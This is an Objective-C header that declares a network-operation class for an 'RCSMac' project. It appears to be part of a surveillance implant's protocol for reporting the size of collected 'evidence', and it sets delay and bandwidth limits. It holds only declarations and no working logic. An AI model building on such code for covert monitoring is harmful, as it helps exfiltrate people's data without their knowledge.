/*
 * SizeNetworkOperation.h
 * RCSMac
 * PROTO_EVIDENCE_SIZE state/message
 *
 *
 * Created by J on 04/04/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import "NetworkOperation.h"
#import "RESTTransport.h"


@interface SizeNetworkOperation : NSObject <NetworkOperation>
{
@private
    RESTTransport *mTransport;
    
@private
    uint32_t mMinDelay;
    uint32_t mMaxDelay;
    uint32_t mBandwidthLimit;
}

- (id)initWithTransport: (RESTTransport *)aTransport
               minDelay: (uint32_t)aMinDelay
               maxDelay: (uint32_t)aMaxDelay
              bandwidth: (uint32_t)aBandwidth;
- (void)dealloc;

- (BOOL) perform: (NSArray *) aArray;

@end
